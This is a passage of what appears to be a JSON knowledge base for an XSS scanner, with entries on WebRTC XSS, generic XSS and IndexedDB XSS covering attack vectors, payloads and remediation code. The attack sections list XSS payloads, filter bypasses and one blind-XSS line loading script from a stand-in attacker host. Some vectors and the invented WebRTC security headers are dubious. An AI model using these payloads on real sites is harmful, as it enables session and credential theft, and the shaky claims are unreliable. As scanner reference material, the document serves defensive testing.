METRICS:\n\nMonitor for:\n- Custom element registration patterns\n- Element name anomalies\n- Attribute value patterns\n- Lifecycle callback execution\n- Registry state changes\n\nOWASP REFERENCES:\n- OWASP Web Components Security\n- OWASP Custom Elements Cheat Sheet\n- Web Components Security Best Practices\n- HTML5 Custom Elements Security\n"
  },
  "webrtc_xss": {
    "title": "Cross-Site Scripting (XSS) in WebRTC Context",
    "severity": "high",
    "cvss_score": 7.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "webrtc",
      "p2p",
      "media-injection",
      "real-time"
    ],
    "description": "\nWebRTC XSS occurs when user input is reflected into WebRTC data channels, media streams, or\nsignaling messages without proper sanitization. WebRTC (Web Real-Time Communication) enables\npeer-to-peer communication between browsers, including video, audio, and data exchange.\nWhen malicious content is injected into WebRTC communications, it can lead to code execution\nacross all participants in a call or session.\n\nVULNERABILITY CONTEXT:\nWebRTC XSS typically happens when:\n1. Usernames/display names are transmitted in signaling\n2. Chat messages in data channels are not sanitized\n3. Media metadata contains malicious content\n4. Session descriptions are manipulated\n5. ICE candidates are injected with scripts\n6. Data channel messages are reflected\n\nCommon in:\n- Video conferencing applications (Zoom, Teams, WebEx)\n- Peer-to-peer chat applications\n- Online gaming platforms\n- Collaborative workspaces\n- Customer support tools\n- Educational platforms\n- Social video platforms\n- Telemedicine applications\n\nSEVERITY: HIGH\nWebRTC XSS allows real-time code execution across multiple participants simultaneously.\nThe peer-to-peer nature makes it difficult to detect and prevent, and attacks can spread\nrapidly through video calls and conferences.\n",
    "attack_vector": "\nWEBRTC XSS ATTACK VECTORS:\n\n1. SIGNALING MESSAGE INJECTION:\n   Server relays signaling data:\n   socket.emit('signal', {\n     type: 'offer',\n     from: USER_INPUT,  // Username injection\n     data: sdpData\n   });\n\n   Attack payload:\n   <script>alert('WebRTC XSS')</script>\n\n2. DATA CHANNEL MESSAGE INJECTION:\n   WebRTC data channel:\n   dataChannel.send(JSON.stringify({\n     type: 'chat',\n     message: USER_INPUT,  // Chat message\n     timestamp: Date.now()\n   }));\n\n   Attack payload:\n   <script>alert(1)</script>\n\n3. USERNAME/DISPLAY NAME INJECTION:\n   Peer connection setup:\n   pc.createOffer().then(function(offer) {\n     return pc.setLocalDescription(offer);\n   }).then(function() {\n     socket.emit('signal', {\n       user: '<script>alert(1)</script>',  // Injected username\n       data: pc.localDescription\n     });\n   });\n\n4. ROOM NAME INJECTION:\n   Join room functionality:\n   socket.emit('join_room', {\n     room: USER_INPUT,  // Room name\n     user: username\n   });\n\n   Attack payload:\n   <img src=x onerror=alert(1)>\n\n5. SESSION DESCRIPTION INJECTION:\n   SDP (Session Description Protocol) manipulation:\n   const sdp = 'v=0\\r\\n' +\n               'o=- ' + USER_INPUT + ' IN IP4 192.168.1.1\\r\\n' +  // Origin line injection\n               's=WebRTC Session\\r\\n';\n\n6. ICE CANDIDATE INJECTION:\n   ICE (Interactive Connectivity Establishment):\n   pc.onicecandidate = function(event) {\n     if (event.candidate) {\n       socket.emit('ice', {\n         candidate: event.candidate.candidate,\n         user: USER_INPUT  // User data in ICE\n       });\n     }\n   });\n\nADVANCED WEBRTC XSS TECHNIQUES:\n\n7. MEDIA TRACK INJECTION:\n   Adding malicious media tracks:\n   const maliciousStream = new MediaStream();\n   maliciousStream.addTrack(maliciousTrack);\n\n   pc.addTrack(maliciousTrack, maliciousStream);\n\n8. DATA CHANNEL PROTOCOL CONFUSION:\n   Sending HTML as data:\n   dataChannel.send('<script>alert(1)</script>');\n\n   Receiving end interprets as HTML:\n   const message = JSON.parse(dataChannelData);\n   document.body.innerHTML = message.content;  // XSS execution\n\n9. SDP PARAMETER INJECTION:\n   Malformed SDP with XSS:\n   const maliciousSDP = 'v=0\\r\\n' +\n                       'o=<script>alert(1)</script> 123456 123456 IN IP4 0.0.0.0\\r\\n' +\n                       's=WebRTC\\r\\n' +\n                       'c=IN IP4 0.0.0.0\\r\\n';\n\n10. RTC PEER CONNECTION HIJACKING:\n    Intercepting and modifying peer connections:\n    const originalCreateOffer = RTCPeerConnection.prototype.createOffer;\n    RTCPeerConnection.prototype.createOffer = function() {\n      return originalCreateOffer.apply(this, arguments).then(function(offer) {\n        offer.sdp = offer.sdp.replace(/o=.*/, 'o=<script>alert(1)</script>');\n        return offer;\n      });\n    };\n\n11. MEDIA CONSTRAINTS INJECTION:\n    Media constraints with XSS:\n    const constraints = {\n      audio: true,\n      video: {\n        width: 1280,\n        height: 720,\n        frameRate: 30,\n        deviceId: USER_INPUT  // Device ID injection\n      }\n    };\n\n12. STUN/TURN SERVER INJECTION:\n    ICE server configuration:\n    const configuration = {\n      iceServers: [{\n        urls: 'stun:stun.l.google.com:19302'\n      }, {\n        urls: 'turn:turn.server.com',\n        username: USER_INPUT,  // Username injection\n        credential: 'password'\n      }]\n    };\n\n13. DATA CHANNEL LABEL INJECTION:\n    Creating data channels with malicious labels:\n    const dataChannel = pc.createDataChannel('<script>alert(1)</script>');\n\n14. PEER IDENTITY INJECTION:\n    WebRTC identity assertion:\n    pc.setIdentityProvider('identity.example.com', {\n      user: USER_INPUT  // Identity injection\n    });\n\n15. MEDIA CAPABILITIES INJECTION:\n    Media capabilities with XSS:\n    navigator.mediaCapabilities.decodingInfo({\n      type: 'file',\n      audio: {contentType: 'audio/webm'},\n      video: {contentType: 'video/webm'}\n    }).then(function(result) {\n      socket.emit('media_info', {\n        capabilities: result,\n        user: USER_INPUT  // User data injection\n      });\n    });\n\nWEBRTC-SPECIFIC BYPASSES:\n\n16. BINARY DATA CHANNEL ATTACK:\n    Sending binary data interpreted as HTML:\n    const binaryData = new TextEncoder().encode('<script>alert(1)</script>');\n    dataChannel.send(binaryData);\n\n17. COMPRESSION ATTACK:\n    Compressed data channel content:\n    dataChannel.binaryType = 'arraybuffer';\n    const compressed = pako.deflate('<script>alert(1)</script>');\n    dataChannel.send(compressed);\n\n18. FRAGMENTED MESSAGE ATTACK:\n    Splitting XSS across multiple data channel messages:\n    dataChannel.send('<scr');\n    dataChannel.send('ipt>alert(1)</scr');\n    dataChannel.send('ipt>');\n\n19. MULTIPLEXING ATTACK:\n    Multiple data channels with coordinated attack:\n    chatChannel.send('Start attack');\n    xssChannel.send('<script>alert(1)</script>');\n\n20. DTLS FINGERPRINT SPOOFING:\n    Fake DTLS certificates with XSS:\n    const fakeFingerprint = 'XX:XX:XX:<script>alert(1)</script>:XX:XX:XX';\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. VIDEO CONFERENCING ATTACK:\n    - Zoom/Teams style application\n    - Attendee name: <script>alert(1)</script>\n    - Displayed in participant list\n    - All participants see script execution\n    - Credential theft from all attendees\n\n22. PEER-TO-PEER CHAT:\n    - Direct messaging between users\n    - Message: <script>stealSession()</script>\n    - Executes on recipient's browser\n    - Session hijacking\n\n23. ONLINE GAMING:\n    - Player communication in game\n    - Player action: <script>alert(1)</script>\n    - Affects all players in session\n    - Game state manipulation\n\n24. CUSTOMER SUPPORT:\n    - Screen sharing with chat\n    - Support message: <script>alert(1)</script>\n    - Executes on customer browser\n    - Information disclosure\n\n25. EDUCATIONAL PLATFORM:\n    - Virtual classroom\n    - Student name: <script>alert(1)</script>\n    - Affects teacher and all students\n    - Session disruption\n\n26. TELEMEDICINE:\n    - Doctor-patient consultation\n    - Patient info: <script>alert(1)</script>\n    - Medical data theft\n\n27. COLLABORATIVE WORKSPACE:\n    - Shared document editing\n    - Comment: <script>alert(1)</script>\n    - Real-time execution across all editors\n\nWEBRTC XSS DETECTION:\n\n28. MANUAL TESTING:\n    - Browser DevTools WebRTC inspection\n    - Monitor signaling messages\n    - Test data channel communication\n    - Check media stream metadata\n\n29. AUTOMATED SCANNING:\n    - WebRTC connection interception\n    - Payload injection in data channels\n    - Signaling message manipulation\n    - Media stream analysis\n\n30. PROXY MONITORING:\n    - WebRTC traffic interception\n    - Message content analysis\n    - Connection pattern monitoring\n",
    "remediation": "\nWEBRTC XSS DEFENSE STRATEGY:\n\n1. SIGNALING MESSAGE SANITIZATION (PRIMARY DEFENSE):\n   Sanitize all signaling messages:\n\n   Node.js signaling server:\n   const DOMPurify = require('dompurify');\n   const cleanUserData = DOMPurify.sanitize(userInput);\n\n   Python signaling server:\n   import bleach\n   clean_message = bleach.clean(message, tags=[], strip=True)\n\n2. DATA CHANNEL CONTENT VALIDATION:\n   Validate data channel messages:\n\n   JavaScript validation:\n   dataChannel.onmessage = function(event) {\n     const data = event.data;\n\n     if (isValidDataChannelMessage(data)) {\n       processMessage(data);\n     } else {\n       console.warn('Invalid data channel message blocked');\n     }\n   };\n\n   function isValidDataChannelMessage(data) {\n     // Strict validation\n     return typeof data === 'string' &&\n            data.length < 1000 &&\n            !data.includes('<script') &&\n            !data.includes('javascript:');\n   }\n\n3. USERNAME/DISPLAY NAME SANITIZATION:\n   Sanitize user identifiers:\n\n   function sanitizeUsername(username) {\n     return username\n       .replace(/<script\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')\n       .replace(/<[^>]*>/g, '')\n       .substring(0, 50);  // Length limit\n   }\n\n4. SDP CONTENT VALIDATION:\n   Validate Session Description Protocol:\n\n   function validateSDP(sdp) {\n     const dangerousPatterns = [\n       /<script/i,\n       /javascript:/i,\n       /vbscript:/i,\n       /onload=/i,\n       /onerror=/i\n     ];\n\n     for (const pattern of dangerousPatterns) {\n       if (pattern.test(sdp)) {\n         throw new Error('Invalid SDP content');\n       }\n     }\n\n     return sdp;\n   }\n\n5. ICE CANDIDATE VALIDATION:\n   Validate ICE candidates:\n\n   function validateICECandidate(candidate) {\n     const cleanCandidate = candidate\n       .replace(/<[^>]*>/g, '')\n       .replace(/javascript:/gi, '')\n       .replace(/vbscript:/gi, '');\n\n     return cleanCandidate;\n   }\n\n6. MEDIA TRACK VALIDATION:\n   Validate media tracks and streams:\n\n   function validateMediaStream(stream) {\n     const tracks = stream.getTracks();\n\n     for (const track of tracks) {\n       const settings = track.getSettings();\n\n       // Validate track labels and IDs\n       if (settings.deviceId && settings.deviceId.includes('<script')) {\n         track.stop();\n         throw new Error('Invalid media track');\n       }\n     }\n\n     return stream;\n   }\n\n7. PEER CONNECTION SECURITY:\n   Secure peer connection configuration:\n\n   const configuration = {\n     iceServers: [\n       {urls: 'stun:stun.l.google.com:19302'}\n     ],\n     iceTransportPolicy: 'all',  // or 'relay' for maximum security\n     bundlePolicy: 'balanced',\n     rtcpMuxPolicy: 'require'\n   };\n\n8. DATA CHANNEL RESTRICTIONS:\n   Implement data channel security:\n\n   const dataChannel = pc.createDataChannel('chat', {\n     ordered: true,\n     maxPacketLifeTime: 3000\n   });\n\n   // Set up message filtering\n   dataChannel.onmessage = function(event) {\n     if (typeof event.data === 'string') {\n       const cleanMessage = DOMPurify.sanitize(event.data);\n       displayMessage(cleanMessage);\n     }\n   };\n\n9. ORIGIN VALIDATION:\n   Validate WebRTC connection origins:\n\n   pc.onconnectionstatechange = function() {\n     if (pc.connectionState === 'connected') {\n       // Validate remote peer identity\n       pc.getIdentityAssertion().then(function(assertion) {\n         if (!isValidPeer(assertion)) {\n           pc.close();\n         }\n       });\n     }\n   };\n\n10. MESSAGE SIZE LIMITS:\n    Implement message size restrictions:\n\n    const MAX_MESSAGE_SIZE = 4096;\n\n    dataChannel.onmessage = function(event) {\n      if (event.data.length > MAX_MESSAGE_SIZE) {\n        console.warn('Message too large, blocked');\n        return;\n      }\n\n      processMessage(event.data);\n    };\n\n11. RATE LIMITING:\n    Implement WebRTC rate limiting:\n\n    let messageCount = 0;\n    const MESSAGE_LIMIT = 10;\n    const TIME_WINDOW = 10000;  // 10 seconds\n\n    setInterval(() => {\n      if (messageCount > MESSAGE_LIMIT) {\n        pc.close();\n      }\n      messageCount = 0;\n    }, TIME_WINDOW);\n\n12. CSP FOR WEBRTC:\n    Content Security Policy:\n\n    Content-Security-Policy:\n      default-src 'self';\n      script-src 'self' 'nonce-{random}';\n      media-src 'self' blob: data:;\n      connect-src 'self' wss: ws:;\n      object-src 'none';\n\n13. WEBRTC FEATURE DETECTION:\n    Feature detection and graceful degradation:\n\n    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {\n      // Fallback to non-WebRTC communication\n      useAlternativeCommunication();\n    }\n\n14. LOGGING AND MONITORING:\n    Comprehensive WebRTC logging:\n\n    pc.oniceconnectionstatechange = function() {\n      logger.info('ICE connection state:', pc.iceConnectionState, {\n        userId: currentUser.id,\n        timestamp: new Date().toISOString()\n      });\n    };\n\n    dataChannel.onmessage = function(event) {\n      logger.debug('Data channel message', {\n        length: event.data.length,\n        type: typeof event.data,\n        userId: currentUser.id\n      });\n    };\n\n15. ERROR HANDLING:\n    Proper error handling:\n\n    pc.onerror = function(error) {\n      logger.error('WebRTC error', {\n        error: error.message,\n        userId: currentUser.id\n      });\n\n      // Don't expose error details to users\n      showGenericError();\n    };\n\n16. REGULAR SECURITY TESTING:\n    WebRTC-specific testing:\n\n    Automated tests:\n    - WebRTC connection establishment\n    - Data channel message validation\n    - Signaling security testing\n    - Media stream security testing\n\n    Manual tests:\n    - Browser DevTools WebRTC inspection\n    - Network tab monitoring\n    - Data channel message inspection\n\nSECURITY TESTING PAYLOADS:\n\nBasic WebRTC XSS:\n<script>alert('WebRTC XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nData channel payloads:\n{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}\n{\"user\": \"<script>alert(1)</script>\", \"message\": \"Hello\"}\n\nSignaling payloads:\n{\"type\": \"join\", \"user\": \"<script>alert(1)</script>\"}\n{\"type\": \"offer\", \"from\": \"<img src=x onerror=alert(1)>\"}\n\nAdvanced payloads:\ndata:text/html,<script>alert(1)</script>\njavascript:alert(1)\nvbscript:msgbox(1)\n\nWEBRTC SECURITY HEADERS:\n\nSec-WebRTC-Fingerprint: (DTLS fingerprint)\nSec-WebRTC-Key: (encrypted key)\nContent-Security-Policy: media-src 'self'\n\nMONITORING METRICS:\n\nMonitor for:\n- Unusual data channel message patterns\n- Signaling message anomalies\n- Media track manipulation attempts\n- Peer connection failures\n- Rate limiting violations\n\nOWASP REFERENCES:\n- OWASP WebRTC Cheat Sheet\n- OWASP Testing Guide: Testing WebRTC\n- WebRTC Security Considerations\n- RFC 8825: WebRTC Security\n"
  },
  "default": {
    "title": "Cross-Site Scripting (XSS) Vulnerability",
    "severity": "high",
    "cvss_score": 7.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
    "reliability": "firm",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "generic",
      "fallback",
      "injection"
    ],
    "description": "\nA Cross-Site Scripting (XSS) vulnerability was detected where user-controlled input is reflected or \nstored in the application without proper sanitization. XSS remains one of the most prevalent web \nvulnerabilities (OWASP Top 10) and can lead to complete compromise of user sessions, credential theft, \nmalware distribution, and defacement.\n\nModern XSS attacks leverage framework-specific bypasses, DOM manipulation, client-side template \ninjection, and advanced encoding techniques to bypass filters and WAFs.\n\nSEVERITY: HIGH to CRITICAL\nDepends on context and exploitability. Can lead to full account takeover.\n",
    "attack_vector": "\nCOMMON XSS VECTORS:\n\n1. REFLECTED XSS\n   User input in URL reflected in response\n   ?search=<script>alert(1)</script>\n\n2. STORED XSS\n   Malicious data saved in database\n   Comment: <img src=x onerror=alert(1)>\n\n3. DOM-BASED XSS\n   Client-side JavaScript processes untrusted data\n   location.hash → innerHTML\n\n4. MUTATION XSS (mXSS)\n   HTML parsed differently by sanitizers vs browsers\n   Payloads that mutate after sanitization\n\n5. BLIND XSS\n   Payload executes in admin panel or logs\n   <script src=//attacker.com/blind.js></script>\n\n6. PROTOTYPE POLLUTION\n   Leading to XSS via polluted properties\n\n7. CSS INJECTION\n   Data exfiltration and UI manipulation\n\n8. SVG-BASED XSS\n   <svg onload=alert(1)>\n\n9. TEMPLATE INJECTION\n   {{constructor.constructor('alert(1)')()}}\n\n10. POSTMESSAGE XSS\n    Cross-origin messaging without validation\n\nIMPACT:\n- Session hijacking (document.cookie theft)\n- Keylogging\n- Credential phishing\n- Cryptocurrency mining\n- Ransomware delivery\n- OAuth token theft\n- CSRF token exfiltration\n- Persistent backdoors\n",
    "remediation": "\nCOMPREHENSIVE DEFENSE STRATEGY:\n\n1. CONTEXT-SENSITIVE OUTPUT ENCODING\n   - HTML entity encoding for HTML context\n   - JavaScript encoding for JS context\n   - URL encoding for URL context\n   - CSS encoding for CSS context\n\n2. CONTENT SECURITY POLICY (CSP)\n   Content-Security-Policy: \n     default-src 'self';\n     script-src 'self' 'nonce-random' 'strict-dynamic';\n     object-src 'none';\n     base-uri 'none';\n\n3. USE MODERN FRAMEWORKS\n   - React (auto-escapes by default)\n   - Vue (auto-escapes in templates)\n   - Angular (DomSanitizer)\n   BUT: Avoid dangerous APIs\n   - dangerouslySetInnerHTML (React)\n   - v-html (Vue)\n   - bypassSecurityTrust (Angular)\n\n4. INPUT VALIDATION\n   Whitelist approach on server-side\n   Reject unexpected characters/patterns\n\n5. HTTPONLY & SECURE COOKIES\n   Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict\n\n6. SECURITY HEADERS\n   - X-Content-Type-Options: nosniff\n   - X-Frame-Options: DENY\n   - Referrer-Policy: no-referrer\n\n7. TRUSTED TYPES API\n   Enforce at browser level (modern browsers)\n\n8. SAMESITE COOKIES\n   Prevent CSRF-based XSS\n\n9. REGULAR SECURITY TESTING\n   - Automated scanners (BRS-XSS, Burp Suite)\n   - Manual penetration testing\n   - Code review\n\n10. DEVELOPER TRAINING\n    Security awareness on XSS prevention\n\n11. WAF AS ADDITIONAL LAYER\n    Not primary defense\n\n12. SUBRESOURCE INTEGRITY (SRI)\n    For third-party scripts\n\nQUICK FIXES:\n- HTML: htmlspecialchars() / html.escape()\n- JavaScript: JSON.stringify() / json.dumps()\n- Use textContent instead of innerHTML\n- Validate URLs with URL parser\n- Implement CSP immediately\n\nTOOLS:\n- BRS-XSS (this scanner)\n- Burp Suite Professional\n- OWASP ZAP\n- DOMPurify (sanitization)\n- ESLint security plugins\n\nOWASP REFERENCES:\n- OWASP Top 10: A03:2021 - Injection\n- CWE-79: Improper Neutralization\n- OWASP XSS Prevention Cheat Sheet\n- OWASP Testing Guide\n"
  },
  "indexeddb_xss": {
    "title": "Cross-Site Scripting (XSS) in IndexedDB Context",
    "severity": "medium",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "indexeddb",
      "client-storage",
      "offline-storage",
      "persistent"
    ],
    "description": "\nIndexedDB XSS occurs when user input is stored in IndexedDB and later reflected into the DOM\nwithout proper sanitization. IndexedDB is a powerful client-side storage system that allows\nstoring large amounts of structured data in the browser. When malicious content is stored\nin IndexedDB and then retrieved and displayed, it can lead to persistent XSS attacks that\nsurvive page refreshes and even browser restarts.\n\nVULNERABILITY CONTEXT:\nIndexedDB XSS typically happens when:\n1. User-generated content is stored without sanitization\n2. Application data is retrieved and displayed in HTML context\n3. Offline-stored content is rendered when online\n4. Cached user profiles or settings contain malicious data\n5. Synchronization between server and client introduces XSS\n\nCommon in:\n- Offline-first applications\n- Progressive Web Apps (PWA)\n- Note-taking applications\n- Document editors\n- Profile management systems\n- Settings/preferences storage\n- Message archiving\n- Content management systems\n\nSEVERITY: MEDIUM\nIndexedDB XSS provides persistence across sessions and can survive cache clearing in some cases.\nHowever, it requires user interaction and is generally less immediate than other XSS types.\n",
    "attack_vector": "\nINDEXEDDB XSS ATTACK VECTORS:\n\n1. USER PROFILE STORAGE INJECTION:\n   Storing user profile data:\n   const transaction = db.transaction(['users'], 'readwrite');\n   const store = transaction.objectStore('users');\n\n   store.add({\n     id: userId,\n     name: USER_INPUT,  // Profile name injection\n     email: 'user@example.com',\n     avatar: '/default.png'\n   });\n\n   Later retrieval and display:\n   const user = storedUserData.name;\n   document.getElementById('profile-name').innerHTML = user;  // XSS execution\n\n2. MESSAGE STORAGE INJECTION:\n   Chat message storage:\n   const messageStore = db.transaction(['messages'], 'readwrite').objectStore('messages');\n\n   messageStore.add({\n     id: Date.now(),\n     from: 'user123',\n     content: USER_INPUT,  // Message content\n     timestamp: Date.now(),\n     type: 'text'\n   });\n\n   Display message:\n   messageDiv.innerHTML = '<b>' + message.from + ':</b> ' + message.content;\n\n3. SETTINGS STORAGE INJECTION:\n   Application settings:\n   const settings = {\n     theme: 'dark',\n     language: 'en',\n     customCSS: USER_INPUT,  // Custom CSS injection\n     notifications: true\n   };\n\n   Later application:\n   const style = document.createElement('style');\n   style.textContent = settings.customCSS;  // XSS in CSS\n   document.head.appendChild(style);\n\n4. OFFLINE CONTENT INJECTION:\n   Offline page content:\n   const offlineStore = db.transaction(['offline'], 'readwrite').objectStore('offline');\n\n   offlineStore.add({\n     url: '/article/123',\n     title: USER_INPUT,  // Article title\n     content: 'Article content...',\n     lastModified: Date.now()\n   });\n\n   Offline display:\n   document.title = article.title;  // XSS in title\n   document.getElementById('content').innerHTML = article.content;\n\n5. CACHE MANIPULATION:\n   Storing cached responses:\n   const cacheStore = db.transaction(['cache'], 'readwrite').objectStore('cache');\n\n   cacheStore.add({\n     request: '/api/user',\n     response: USER_INPUT,  // Cached response\n     timestamp: Date.now(),\n     expires: Date.now() + 3600000\n   });\n\n   Using cached data:\n   const userData = JSON.parse(cachedResponse.response);\n   document.getElementById('user-info').innerHTML = userData.html;\n\nADVANCED INDEXEDDB XSS TECHNIQUES:\n\n6. OBJECT STORE SCHEMA INJECTION:\n   Creating malicious object stores:\n   const maliciousStore = {\n     name: '<script>alert(1)</script>',  // Store name injection\n     keyPath: 'id',\n     autoIncrement: false\n   };\n\n   db.createObjectStore(maliciousStore.name, {\n     keyPath: maliciousStore.keyPath\n   });\n\n7. INDEX NAME INJECTION:\n   Creating indexes with XSS:\n   const maliciousIndex = {\n     name: '<img src=x onerror=alert(1)>',  // Index name\n     keyPath: 'name',\n     unique: false\n   };\n\n   store.createIndex(maliciousIndex.name, maliciousIndex.keyPath);\n\n8. TRANSACTION NAME INJECTION:\n   Transaction naming with XSS:\n   const transaction = db.transaction(['users'],\n     '<script>alert(1)</script>'  // Transaction name\n   );\n\n9. DATABASE NAME INJECTION:\n   Opening database with XSS name:\n   const request = indexedDB.open('<script>alert(1)</script>', 1);\n\n10. VERSION CHANGE INJECTION:\n    Database version upgrade with XSS:\n    request.onupgradeneeded = function(event) {\n      const db = event.target.result;\n\n      // Inject XSS into version change\n      const script = document.createElement('script');\n      script.textContent = USER_INPUT;  // Version script injection\n      document.head.appendChild(script);\n    };\n\n11. CURSOR ITERATION INJECTION:\n    Iterating over data with XSS:\n    const transaction = db.transaction(['messages']);\n    const store = transaction.objectStore('messages');\n    const request = store.openCursor();\n\n    request.onsuccess = function(event) {\n      const cursor = event.target.result;\n      if (cursor) {\n        const message = cursor.value;\n        displayMessage(message);  // Potential XSS in display\n        cursor.continue();\n      }\n    };\n\n12. BLOB STORAGE INJECTION:\n    Storing binary data with XSS:\n    const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});\n    const blobStore = db.transaction(['blobs'], 'readwrite').objectStore('blobs');\n\n    blobStore.add({\n      id: 'user-content',\n      data: blob,\n      type: 'html'\n    });\n\n13. KEY PATH INJECTION:\n    Object store with malicious key path:\n    const maliciousKeyPath = 'data.<script>alert(1)</script>.value';\n\n    db.createObjectStore('objects', {keyPath: maliciousKeyPath});\n\n14. CONSTRAINT INJECTION:\n    Unique constraints with XSS:\n    store.createIndex('unique_index', '<script>alert(1)</script>', {unique: true});\n\n15. EVENT HANDLER INJECTION:\n    Database event handlers with XSS:\n    request.onerror = function(event) {\n      // Error message might contain XSS\n      showError(event.target.error.message);\n    };\n\nINDEXEDDB-SPECIFIC BYPASSES:\n\n16. POLYGLOT STORAGE:\n    Storing polyglot payloads that work in multiple contexts:\n    javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>\n\n17. ENCODING BYPASSES:\n    Storing encoded XSS:\n    %3Cscript%3Ealert(1)%3C/script%3E\n    \\u003cscript\\u003ealert(1)\\u003c/script\\u003e\n\n18. COMMENT-BASED INJECTION:\n    Storing XSS in comments:\n    <!-- <script>alert(1)</script> -->\n    /* <script>alert(1)</script> */\n\n19. NULL BYTE INJECTION:\n    <script>alert(1)</script>%00\n    May bypass some validation\n\n20. NEWLINE INJECTION:\n    \\n<script>alert(1)</script>\n    Can break parsing context\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. NOTE-TAKING APPLICATION:\n    - User saves note: <script>alert('XSS')</script>\n    - Note stored in IndexedDB\n    - Displayed when app loads\n    - Persistent XSS across sessions\n\n22. OFFLINE EMAIL CLIENT:\n    - Email stored offline\n    - Subject: <script>alert(1)</script>\n    - Subject displayed in list\n    - Affects all offline usage\n\n23. E-COMMERCE WISHLIST:\n    - Product names in wishlist\n    - Product: <script>alert(1)</script>\n    - Stored offline for later purchase\n    - Executes when viewing wishlist\n\n24. SOCIAL MEDIA OFFLINE:\n    - Posts cached for offline viewing\n    - Post content: <script>alert(1)</script>\n    - Executes when viewing offline\n\n25. DOCUMENT COLLABORATION:\n    - Collaborative editing\n    - Comment: <script>alert(1)</script>\n    - Stored in IndexedDB for sync\n    - Affects all collaborators\n\n26. PROFILE CUSTOMIZATION:\n    - Custom user profiles\n    - Bio: <script>alert(1)</script>\n    - Displayed on profile page\n    - Persistent across logins\n\n27. SETTINGS PERSISTENCE:\n    - User preferences\n    - Custom theme: <script>alert(1)</script>\n    - Applied to all pages\n    - Global XSS effect\n\nINDEXEDDB XSS DETECTION:\n\n28. MANUAL TESTING:\n    - DevTools Application > IndexedDB inspection\n    - Check stored data for malicious content\n    - Test data retrieval and display\n    - Monitor for script execution\n\n29. AUTOMATED SCANNING:\n    - IndexedDB content analysis\n    - Stored data validation\n    - Retrieval and display testing\n    - Offline functionality testing\n\n30. BROWSER EXTENSIONS:\n    - IndexedDB monitoring extensions\n    - Content inspection tools\n    - Storage manipulation detection\n",
    "remediation": "\nINDEXEDDB XSS DEFENSE STRATEGY:\n\n1. DATA SANITIZATION BEFORE STORAGE (PRIMARY DEFENSE):\n   Sanitize all data before storing in IndexedDB:\n\n   JavaScript sanitization:\n   const DOMPurify = require('dompurify');\n\n   function sanitizeForStorage(data) {\n     if (typeof data === 'string') {\n       return DOMPurify.sanitize(data, {\n         ALLOWED_TAGS: [],  // No HTML tags allowed\n         ALLOWED_ATTR: []\n       });\n     }\n     return data;\n   }\n\n   Python backend sanitization:\n   import bleach\n   clean_data = bleach.clean(user_input, tags=[], strip=True)\n\n2. DATA VALIDATION BEFORE DISPLAY:\n   Validate data when retrieving from IndexedDB:\n\n   function validateStoredData(data) {\n     // Check data type\n     if (typeof data !== 'string') return data;\n\n     // Length limits\n     if (data.length > 10000) return '[Content too long]';\n\n     // Content validation\n     const dangerousPatterns = [\n       /<script\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi,\n       /javascript:/gi,\n       /vbscript:/gi,\n       /on\\w+\\s*=/gi\n     ];\n\n     for (const pattern of dangerousPatterns) {\n       if (pattern.test(data)) {\n         return '[Invalid content removed]';\n       }\n     }\n\n     return data;\n   }\n\n3. SAFE RETRIEVAL METHODS:\n   Use safe methods for displaying stored data:\n\n   // BAD - Direct HTML insertion\n   element.innerHTML = storedData;\n\n   // GOOD - Safe text display\n   element.textContent = storedData;\n\n   // GOOD - Controlled HTML (if needed)\n   element.innerHTML = DOMPurify.sanitize(storedData);\n\n4. DATABASE SCHEMA VALIDATION:\n   Define strict database schemas:\n\n   const DB_SCHEMA = {\n     users: {\n       name: {type: 'string', maxLength: 50, pattern: /^[a-zA-Z0-9\\s]+$/},\n       email: {type: 'string', pattern: /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/},\n       avatar: {type: 'string', pattern: /^https?:\\/\\/.+/}\n     },\n     messages: {\n       content: {type: 'string', maxLength: 1000},\n       timestamp: {type: 'number'},\n       type: {type: 'string', enum: ['text', 'image', 'file']}\n     }\n   };\n\n5. INPUT VALIDATION:\n   Validate data before storage:\n\n   function validateUserInput(input, schema) {\n     if (schema.maxLength && input.length > schema.maxLength) {\n       throw new Error('Input too long');\n     }\n\n     if (schema.pattern && !schema.pattern.test(input)) {\n       throw new Error('Invalid input format');\n     }\n\n     if (schema.enum && !schema.enum.includes(input)) {\n       throw new Error('Invalid input value');\n     }\n\n     return true;\n   }\n\n6. ENCRYPTION FOR SENSITIVE DATA:\n   Encrypt sensitive data before storage:\n\n   async function storeEncryptedData(key, data) {\n     const encrypted = await encryptData(data);\n     const store = db.transaction(['sensitive'], 'readwrite').objectStore('sensitive');\n     store.add({key: key, data: encrypted});\n   }\n\n7. VERSION CONTROL AND MIGRATION:\n   Handle database version upgrades safely:\n\n   const DB_VERSION = 2;\n\n   request.onupgradeneeded = function(event) {\n     const db = event.target.result;\n     const oldVersion = event.oldVersion;\n\n     if (oldVersion < 2) {\n       // Migrate existing data and sanitize\n       migrateAndSanitizeData(db);\n     }\n   };\n\n8. ERROR HANDLING:\n   Proper error handling without information disclosure:\n\n   request.onerror = function(event) {\n     logger.error('IndexedDB error', {\n       error: event.target.error.message,\n       operation: 'unknown'\n     });\n\n     // Show generic error to user\n     showGenericError();\n   };\n\n9. STORAGE QUOTAS AND LIMITS:\n   Implement storage 